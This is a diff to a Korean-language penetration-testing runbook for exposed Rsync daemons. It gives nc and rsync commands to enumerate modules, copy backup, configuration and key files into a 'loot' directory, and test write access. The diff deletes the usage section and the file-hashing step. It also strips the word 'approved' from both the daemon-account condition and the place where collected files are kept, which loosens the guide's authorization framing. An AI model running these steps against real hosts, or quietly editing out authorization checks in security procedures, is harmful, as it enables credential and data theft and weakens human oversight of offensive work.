@@ -13,12 +13,6 @@ tags:
 
 현재 명령 실행 위치에서 대상 Rsync 873/TCP에 연결할 수 있으면 공개 모듈과 실제 파일 읽기 범위를 확인해 필요한 백업·설정·키 파일을 로컬로 수집하고, 필요하면 고유 검증 파일로 모듈 쓰기 권한을 확인한다.
 
-## 사용할 때
-
-- Rsync daemon의 module 목록이 공개될 때.
-- 백업·배포·홈 디렉터리 module에서 설정·키 파일을 조사할 때.
-- module 목록, `--list-only`와 실제 파일 동기화를 구분해야 할 때.
-
 ## 전제 조건
 
 | 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
@@ -30,6 +24,8 @@ tags:
 
 ## 실행
 
+`<TARGET>`은 Rsync daemon 주소(가상 예시 `192.0.2.73`), `<MODULE>`은 daemon 목록 또는 확인된 module 이름, `<RSYNC_USER>`는 `auth required`가 반환될 때의 daemon 계정이다. `$LOOT_DIR`은 공격 호스트에서 `mktemp`로 새로 만들 수집 경로이며, `$PROOF`는 쓰기 검증을 선택할 때 생성·원격 목록·정리에 같은 basename으로 쓴다.
+
 ```bash
 nc -nv <TARGET> 873
 rsync rsync://<TARGET>/
@@ -37,18 +33,17 @@ rsync --list-only rsync://<TARGET>/<MODULE>/
 LOOT_DIR="$(mktemp -d ./loot-rsync.XXXXXX)"
 rsync -av rsync://<TARGET>/<MODULE>/ "$LOOT_DIR/"
 find "$LOOT_DIR" -maxdepth 2 -type f -printf '%p %s bytes\n'
-find "$LOOT_DIR" -type f -exec sha256sum -- {} +
 ```
 
 확인할 출력:
 
 - daemon greeting, module 이름과 설명.
 - 원격 파일 mode·owner·group과 목록.
-- 실제 다운로드된 파일의 크기·hash와 전송 요약.
+- 실제 다운로드된 파일과 전송 요약.
 
 ### 인증이 필요한 daemon module
 
-Rsync daemon의 계정은 SSH 계정과 같은 주체라고 가정하지 않는다. module이 `auth required`를 반환하고 승인된 daemon 계정이 있을 때는 사용자명만 URL에 넣고 비밀번호 prompt로 입력한다.
+Rsync daemon의 계정은 SSH 계정과 같은 주체라고 가정하지 않는다. module이 `auth required`를 반환하고 daemon 계정이 있을 때는 사용자명만 URL에 넣고 비밀번호 prompt로 입력한다.
 
 ```bash
 rsync --list-only rsync://<RSYNC_USER>@<TARGET>/<MODULE>/
@@ -78,7 +73,7 @@ rsync --list-only "rsync://<TARGET>/<MODULE>/$PROOF"
 | 관찰 | 판단 | 결과 상태 | 다음 행동 |
 |---|---|---|---|
 | module·목록 반환 | 공개 module 메타데이터와 READ 후보 | 공개 파일 목록 | 필요한 파일만 선택해 동기화 |
-| 다운로드와 로컬 hash 확인 | module 파일을 온전히 읽음 | 백업·설정·키 파일 수집 | 파일별 자격 증명·키 확인 |
+| 다운로드한 파일을 읽을 수 있음 | module 파일을 읽음 | 백업·설정·키 파일 수집 | 파일별 자격 증명·키 확인 |
 | `auth required` | daemon account 또는 secrets 정책 필요 | 익명 접근 불가 | 보유 계정의 대상·형식 확인 |
 | 인증 뒤 목록만 성공 | daemon 인증과 경로 열거 가능 | 인증된 READ 후보 | 필요한 파일 하나를 동기화해 내용 접근 확인 |
 | 검증 파일 업로드와 원격 조회 성공 | 해당 module에 새 파일 생성 가능 | Rsync 쓰기 권한 | module의 실제 사용 경로와 파일 처리 방식을 별도로 확인 |
@@ -90,7 +85,7 @@ rsync --list-only "rsync://<TARGET>/<MODULE>/$PROOF"
 
 ## 변경 영향과 복구
 
-다운로드는 대상 module을 변경하지 않지만 공격 호스트의 `$LOOT_DIR`에 파일을 만든다. 수집본은 Vault 밖의 승인된 위치에서 보존·폐기하며, 기존 디렉터리와 섞이지 않게 이번 `mktemp` 경로를 기록한다.
+다운로드는 대상 module을 변경하지 않지만 공격 호스트의 `$LOOT_DIR`에 파일을 만든다. 수집본은 Vault 밖 위치에서 보존·폐기하며, 기존 디렉터리와 섞이지 않게 이번 `mktemp` 경로를 기록한다.
 
 원격 module에서 단일 파일 삭제를 검증할 때는 빈 디렉터리와 include 규칙으로 이번 파일만 대상으로 한다.
 
